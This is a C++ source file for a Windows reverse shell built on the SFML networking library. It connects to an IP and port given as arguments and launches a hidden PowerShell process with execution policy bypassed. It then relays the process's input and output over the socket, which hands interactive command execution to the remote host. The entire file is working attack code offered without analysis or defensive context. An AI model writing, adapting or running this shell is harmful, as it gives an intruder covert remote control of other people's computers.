// SFML_ReverseShell.cpp : Defines the entry point for the application.
//

#include "SFML_ReverseShell.h"

using namespace std;

int main(int argc, char *argv[])
{
        sf::TcpSocket socket;
        
        if (argc < 3) {
            std::cout << argv[0] << " ip port\n";
            return 1;
        }

        sf::IpAddress ip(argv[1]);
        int port = std::stoi(argv[2]);
        unsigned short port16 = static_cast<unsigned short>(port);

        std::cout << "Connecting to " << ip.toString() << ":" << port16 << std::endl;

        if (socket.connect(ip, port16) != sf::Socket::Done) {
            std::cerr << "Failed to connect to the server.\n";
            return 1;
        }
        
        // PowerShell executable and arguments
        std::wstring powershellExe = L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
        std::wstring arguments = L"-ep bypass -nologo -noni";

        // Command line
        std::wstring commandLine = powershellExe + L" " + arguments;

        // Initialize the structures
        STARTUPINFOW si = {};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        si.wShowWindow = SW_HIDE;  // Hide the PowerShell window

        SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };

        // Create pipes for standard input/output/error redirection
        HANDLE hStdOutRead, hStdOutWrite;
        HANDLE hStdErrRead, hStdErrWrite;
        HANDLE hStdInRead, hStdInWrite;

        // Create the pipes
        if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0)) {
            std::cerr << "CreatePipe failed for stdout (" << GetLastError() << ").\n";
            return 1;
        }
        if (!CreatePipe(&hStdErrRead, &hStdErrWrite, &sa, 0)) {
            std::cerr << "CreatePipe failed for stderr (" << GetLastError() << ").\n";
            CloseHandle(hStdOutRead);
            CloseHandle(hStdOutWrite);
            return 1;
        }
        if (!CreatePipe(&hStdInRead, &hStdInWrite, &sa, 0)) {
            std::cerr << "CreatePipe failed for stdin (" << GetLastError() << ").\n";
            CloseHandle(hStdOutRead);
            CloseHandle(hStdOutWrite);
            CloseHandle(hStdErrRead);
            CloseHandle(hStdErrWrite);
            return 1;
        }

        // Set the standard handles for the new process
        si.hStdOutput = hStdOutWrite;
        si.hStdError = hStdErrWrite;
        si.hStdInput = hStdInRead;

        PROCESS_INFORMATION pi = {};

        // Create the PowerShell process
        if (!CreateProcessW(
            NULL,                   // No module name (use command line)
            &commandLine[0],        // Command line
            NULL,                   // Process handle not inheritable
            NULL,                   // Thread handle not inheritable
            TRUE,                   // Set handle inheritance to TRUE
            CREATE_NO_WINDOW,       // Creation flags to hide the window
            NULL,                   // Use parent's environment block
            NULL,                   // Use parent's starting directory
            &si,                    // Pointer to STARTUPINFO structure
            &pi)                    // Pointer to PROCESS_INFORMATION structure
            ) {
            std::cerr << "CreateProcess failed (" << GetLastError() << ").\n";
            CloseHandle(hStdOutRead);
            CloseHandle(hStdOutWrite);
            CloseHandle(hStdErrRead);
            CloseHandle(hStdErrWrite);
            CloseHandle(hStdInRead);
            CloseHandle(hStdInWrite);
            return 1;
        }

        // Close handles that are not needed by the parent process
        CloseHandle(hStdOutWrite);
        CloseHandle(hStdErrWrite);
        CloseHandle(hStdInRead);

        char buffer[4096];
        DWORD bytesRead;

        // Read and send the output from the child process to the socket
        std::thread outputThread([&]() {
            while (ReadFile(hStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                if (socket.send(buffer, bytesRead) != sf::Socket::Done) {
                    std::cerr << "Failed to send data to the server.\n";
                }
                std::cout << "Sent to server: " << buffer << "\n"; // Debugging output
            }
            });

        // Read and send any error output from the child process to the socket
        std::thread errorThread([&]() {
            while (ReadFile(hStdErrRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                if (socket.send(buffer, bytesRead) != sf::Socket::Done) {
                    std::cerr << "Failed to send error data to the server.\n";
                }
                std::cerr << "Sent error data to server: " << buffer << "\n"; // Debugging output
            }
            });

        // Continuously read from the socket and write to PowerShell's stdin
        while (true) {
            std::size_t received;
            if (socket.receive(buffer, sizeof(buffer), received) == sf::Socket::Done) {
                DWORD bytesWritten;
                if (!WriteFile(hStdInWrite, buffer, static_cast<DWORD>(received), &bytesWritten, NULL)) {
                    std::cerr << "WriteFile to stdin failed (" << GetLastError() << ").\n";
                }
                std::cout << "Received from server and sent to PowerShell: " << std::string(buffer, received) << "\n"; // Debugging output
            }
            else {
                std::cerr << "Failed to receive data from the server.\n";
                break;
            }
        }

        // Wait until the process exits
        WaitForSingleObject(pi.hProcess, INFINITE);

        // Close process and thread handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hStdOutRead);
        CloseHandle(hStdErrRead);
        CloseHandle(hStdInWrite);

        outputThread.join();
        errorThread.join();

     
	return 0;
}
